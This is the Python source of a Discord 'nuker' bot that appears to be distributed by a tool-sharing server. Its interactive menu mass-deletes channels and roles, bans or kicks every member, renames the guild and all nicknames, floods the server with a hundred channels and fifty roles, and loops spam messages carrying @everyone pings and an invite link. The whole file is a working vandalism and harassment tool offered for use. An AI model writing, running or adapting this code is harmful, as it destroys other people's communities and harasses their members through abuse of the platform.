import discord
from discord.ext import commands
from discord.utils import oauth_url

import os, sys, time, asyncio, os, json
from colorama import Fore, Style


w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTMAGENTA_EX
lb = Fore.LIGHTBLUE_EX
# r = Fore.RESET



# Get the login value
print(f"\n[#] Loading...")
token = input(f"{Fore.LIGHTMAGENTA_EX}[#] Enter bot token : ")





# Print a success message
input(f"\n{Fore.LIGHTMAGENTA_EX}\n[#] Press ENTER to Continue: ")




intents = discord.Intents.all()
bot = commands.Bot(command_prefix="=", intents=intents)



@bot.event
async def on_ready():
    print(f"{Fore.LIGHTCYAN_EX} BOT ONLINE")
    await menu()
    await spammer()



async def handle_rate_limit(error):
    if isinstance(error, discord.HTTPException) and error.code == 429:
        # Calculate the time to sleep based on the rate limit headers
        retry_after = int(error.headers.get('Retry-After', 5))
        print(f"[{Fore.LIGHTRED_EX}>{Style.BRIGHT}] Rate limited, sleeping for {retry_after} seconds...")
        await asyncio.sleep(retry_after)
    else:
        raise error

async def menu():
    print(f"""{Fore.LIGHTMAGENTA_EX}███╗   ██╗██╗   ██╗██╗  ██╗
████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
██║╚██╗██║  ╚██╔╝   ██╔██╗ 
██║ ╚████║   ██║   ██╔╝ ██╗
╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ {Fore.RESET} {Style.BRIGHT} \n""")
    print(f"{Fore.LIGHTMAGENTA_EX} made by gg/nyxservices{Fore.RESET} {Style.BRIGHT} \n")
    print(f"{Fore.LIGHTMAGENTA_EX} logged in as {bot.user} \n")
    invite_link = oauth_url(bot.user.id, scopes=["bot"])
    print(f"{Fore.LIGHTMAGENTA_EX}inv{Fore.RESET} {invite_link} {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}1{Fore.RESET}] create channels {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}2{Fore.RESET}] delete channels {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}3{Fore.RESET}] mass ban {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}4{Fore.RESET}] mass kick {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}5{Fore.RESET}] nickname changer {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}6{Fore.RESET}] create roles {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}7{Fore.RESET}] delete roles {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}8{Fore.RESET}] rename guild {Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}9{Fore.RESET}] pro nuke(dont use still in beta){Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}10{Fore.RESET}] auto spam{Style.BRIGHT} \n")
    print(f"[{Fore.LIGHTMAGENTA_EX}11{Fore.RESET}] exit {Style.BRIGHT} \n")
    



async def spammer():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        await menu()

        choice = input(f"{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX} -> {Fore.RESET}")

        if choice == "1":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            ch_names = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Channel name : ")
            
            ch_tasks = []

            for i in range(100):
                ch_task = asyncio.create_task(guild.create_text_channel(name=ch_names))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] created | {ch_names}")
                ch_tasks.append(ch_task)
            await asyncio.gather(*ch_tasks)

        
        elif choice == "2":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            del_ch_tasks = []
            for channel in guild.channels:
                del_ch_task = asyncio.create_task(channel.delete())
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] deleted | {channel.id}")
                del_ch_tasks.append(del_ch_task)
            await asyncio.gather(*del_ch_tasks)


        elif choice == "3":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            users_ban_tasks = []
            for member in guild.members:
                user_ban_task = asyncio.create_task(member.ban(reason="got nuked bozo!"))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] banned | {member.id}")
                users_ban_tasks.append(user_ban_task)
            await asyncio.gather(*users_ban_tasks)


        elif choice == "4":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            users_kick_tasks = []
            for member in guild.members:
                user_kick_task = asyncio.create_task(member.kick(reason="got nuked bozo!"))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] kicked | {member.id}")
                users_ban_tasks.append(user_kick_task)
            await asyncio.gather(*users_kick_tasks)

        elif choice == "5":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)
            nickname = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Nickname : ")
            nick_tasks = []
            for member in guild.members:
                nick_task = asyncio.create_task(member.edit(nick=nickname))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] changed | {member.id}")
                nick_tasks.append(nick_task)
            await asyncio.gather(*nick_tasks)


        elif choice == "6":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            roles_name = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Role name : ")

            roles_tasks  = []

            for i in range(50):
                role_task = asyncio.create_task(guild.create_role(name=roles_name))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] created | {roles_name}")
                roles_tasks.append(role_task)
            await asyncio.gather(*roles_tasks)

        
        elif choice == "7":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            del_roles_tasks  = []

            for role in guild.roles:
                del_role_task = asyncio.create_task(role.delete())
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] deleted | {role.id}")
                roles_tasks.append(del_role_task)
            await asyncio.gather(*del_roles_tasks)

        elif choice == "8":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Guild id : "))
            guild = bot.get_guild(guild)

            newname = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter new name : ")

            
            await guild.edit(name=newname)
            print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] edited | {guild.id}")


        elif choice == "9":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter guild id : "))
            newname = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter new name : ")
            ch_names = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Channel name : ")
            roles_name = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter Role name : ")
            guild = bot.get_guild(guild)
            channels = guild.channels
            await guild.edit(name=newname)
            print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] edited | {guild.id}")

            roles_tasks  = []
            del_ch_tasks = []
            ch_tasks = []
            


            for channel in guild.channels:
                del_ch_task = asyncio.create_task(channel.delete())
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] deleted | {channel.id}")
                del_ch_tasks.append(del_ch_task)
            await asyncio.gather(*del_ch_tasks)
            await asyncio.sleep(4)
            for i in range(79):
                ch_task = asyncio.create_task(guild.create_text_channel(name=ch_names))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] created | {ch_names}")
                ch_tasks.append(ch_task)
            await asyncio.gather(*ch_tasks)

            @bot.event
            async def on_guild_channel_create(channel):
                        await asyncio.sleep(5)
                        while True:
                            if channel.guild.get_channel(channel.id) is not None:
                                send_create_task = asyncio.create_task(channel.send(f'https://discord.gg/vZfAQfwjUr FOR MORE TOOLS ||@everyone @here|| NUKEDDD'))
                                await send_create_task
                                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}]msg sent | {channel.name}")
                                await asyncio.sleep(2)
            
            for i in range(50):
                role_task = asyncio.create_task(guild.create_role(name=roles_name))
                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}] created | {roles_name}")
                roles_tasks.append(role_task)
            await asyncio.gather(*roles_tasks)



        elif choice =="10":
            guild = int(input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT} enter guild : "))
            print(f"[{Fore.LIGHTMAGENTA_EX}#{Fore.RESET}] true{Style.BRIGHT} \n")
            print(f"[{Fore.LIGHTMAGENTA_EX}#{Fore.RESET}] false {Style.BRIGHT} \n")
            guild = bot.get_guild(guild)
            channels = guild.channels

            send_create_tasks = []


            auto_message_choice = input(f"{Fore.LIGHTMAGENTA_EX}#{Style.BRIGHT}Enter your choice (true or false) : ")
            if auto_message_choice.lower() == "true":
                @bot.event
                async def on_guild_channel_create(channel):
                        await asyncio.sleep(4)
                        while True:
                            if channel.guild.get_channel(channel.id) is not None:
                                send_create_task = asyncio.create_task(channel.send(f'https://discord.gg/vZfAQfwjUr FOR MORE TOOLS ||@everyone @here|| NUKEDDD'))
                                await send_create_task
                                print(f"[{Fore.LIGHTMAGENTA_EX}>{Style.BRIGHT}]msg sent | {channel.name}")
                                await asyncio.sleep(2)
                            else:
                                break

                        #
                        #send_create_task = asyncio.create_task(channel.send(f'**discord.gg/gEVCGtszF4** FOR MORE TOOLS ||@everyone||'))
                        #for _ in range(10):

                            ###
                            #send_create_tasks.append(send_create_task)
                            #await asyncio.gather(*send_create_tasks)
                            #await asyncio.sleep(3)
                            ###





        elif choice == "11":
            sys.exit()

            




bot.run(token)



